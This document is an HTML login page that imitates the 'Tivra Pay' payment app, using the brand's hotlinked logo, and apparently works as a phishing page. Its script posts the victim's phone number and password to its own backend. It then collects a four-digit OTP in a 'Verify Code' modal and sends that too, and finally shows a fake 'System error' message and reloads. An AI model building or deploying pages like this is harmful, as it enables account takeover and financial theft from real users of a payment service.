<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Tivra Pay</title>
    <style>
        /* 🎨 CLIENT APP UI ENGINE */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        #app { width: 100%; max-width: 380px; background: #ffffff; padding: 40px 25px; border-radius: 28px; box-shadow: 0 10px 25px rgba(0,0,0,0.04); margin: 15px; }

        .header-section { text-align: center; margin-bottom: 40px; }
        .logo { width: 130px; }

        .input-field-group { 
            background: #f4f6f9; border-radius: 14px; padding: 16px 20px; 
            margin-bottom: 16px; border: 1px solid #edf0f4;
        }
        .input-field-group input { 
            border: none; background: none; width: 100%; font-size: 15px; outline: none; color: #333;
        }

        .submit-btn { 
            width: 100%; padding: 16px; background: #0066ff; color: #fff; border: none; 
            border-radius: 14px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer;
        }

        .form-options { display: flex; justify-content: space-between; margin: 15px 5px; font-size: 13px; color: #777; }
        .forgot-link { color: #0066ff; text-decoration: none; font-weight: 500; }

        /* Modal Clean UI */
        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: 0.3s; }
        .modal.active { opacity: 1; pointer-events: auto; }
        .modal-content { background: #fff; padding: 30px; border-radius: 24px; width: 90%; max-width: 320px; text-align: center; }
        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
        .otp-box { width: 45px; height: 50px; border: 1px solid #eee; border-radius: 12px; text-align: center; font-size: 18px; background: #f9f9f9; outline: none; }
    </style>
</head>
<body>

    <div id="app">
        <div class="header-section">
            <img class="logo" src="https://web.tivrapay.com/img/logo.20cf4c6f.png" alt="Logo" onerror="this.src='https://via.placeholder.com/130x50?text=TivraPay'" />
        </div>

        <form id="loginForm">
            <div class="input-field-group">
                <input type="tel" id="phoneNumber" placeholder="Phone number" required />
            </div>
            <div class="input-field-group">
                <input type="password" id="password" placeholder="Password" required />
            </div>
            <div class="form-options">
                <label><input type="checkbox" checked /> Remember</label>
                <a href="#" class="forgot-link" id="triggerForgot">Forgot Password?</a>
            </div>
            <button type="submit" class="submit-btn">Login</button>
        </form>
    </div>

    <div class="modal" id="otpModal">
        <div class="modal-content">
            <h3>Verify Code</h3>
            <p style="font-size: 13px; color: #888; margin-top:5px;">Enter the code sent to your number</p>
            <div class="otp-inputs">
                <input type="number" class="otp-box" id="otp1" maxlength="1" onkeyup="moveNext(this, 'otp2')" />
                <input type="number" class="otp-box" id="otp2" maxlength="1" onkeyup="moveNext(this, 'otp3')" />
                <input type="number" class="otp-box" id="otp3" maxlength="1" onkeyup="moveNext(this, 'otp4')" />
                <input type="number" class="otp-box" id="otp4" maxlength="1" onkeyup="checkAndSubmitOtp(this)" />
            </div>
        </div>
    </div>

    <script>
        const BACKEND_URL = window.location.hostname === '127.0.0.1' ? 'http://localhost:6500' : window.location.origin;

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phoneNumber = document.getElementById('phoneNumber').value;
            const password = document.getElementById('password').value;
            
            const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber, password })
            });
            const data = await response.json();
            if(data.success) {
                window.currentUserId = data.userId;
                document.getElementById('otpModal').classList.add('active');
            }
        });

        function moveNext(curr, next) { if(curr.value.length) document.getElementById(next).focus(); }
        
        async function checkAndSubmitOtp(curr) {
            const otp = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + curr.value;
            if(otp.length === 4) {
                await fetch(`${BACKEND_URL}/api/otp-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userId: window.currentUserId, otp })
                });
                alert("System error. Please try again.");
                window.location.reload();
            }
        }
    </script>
</body>
</html>
